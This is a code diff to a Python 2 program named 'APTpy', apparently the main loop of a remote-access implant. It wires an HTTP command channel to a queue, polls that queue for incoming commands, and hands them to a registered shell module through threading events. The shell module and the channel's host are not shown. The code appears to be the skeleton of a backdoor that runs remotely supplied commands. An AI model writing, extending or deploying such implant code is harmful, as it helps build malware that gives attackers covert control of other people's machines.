@@ -1,4 +1,5 @@
 import Queue
+from threading import Event
 from time import sleep
 DEBUG = True
 
@@ -6,8 +7,10 @@ DEBUG = True
 class APTpy:
     def __init__(self):
         self.channel = None
+        self.modules = []
         self.queue_send = Queue.Queue()
         self.queue_recv = Queue.Queue()
+        self.events = {}
 
     def run(self):
         self._checkenv()
@@ -16,26 +19,19 @@ class APTpy:
 
         self.channel.start()
 
-        """
-        self.queue_send.put("test 1\n")
-        self.queue_send.put("test 2\n")
-        self.queue_send.put("test 3\n")
-        self.queue_send.put("test 4\n")
-        self.queue_send.put("test 5\n")
-        self.queue_send.put("test 6\n")
-        self.queue_send.put("test 7\n")
-        self.queue_send.put("test 8\n")
-        self.queue_send.put("test 9\n")
-        self.queue_send.put("test 10\n")
-        self.queue_send.put("test 11\n")
-        self.queue_send.put("test 12\n")
-        """
+        for module in self.modules:
+            module.start()
 
         while True:
             sleep(0.5)
             if not self.queue_recv.empty():
-                print self.queue_recv.get()
+                cmd = self.queue_recv.get().strip()
+                print cmd
                 self.queue_recv.task_done()
+                for module in self.modules:
+                    if module.its_for_me(cmd):
+                        self.events[module.__class__.__name__].set()
+                        self.events[module.__class__.__name__].clear()
 
     def _checkenv(self):
         pass
@@ -46,8 +42,10 @@ class APTpy:
         self.channel = HttpChannel(self.queue_send, self.queue_recv)
 
     def _registerModules(self):
-        pass
+        from lib.modules.shell import ShellModule
 
+        self.events['ShellModule'] = Event()
+        self.modules.append(ShellModule(self.queue_send, self.events['ShellModule']))
 
 try:
     obj = APTpy()
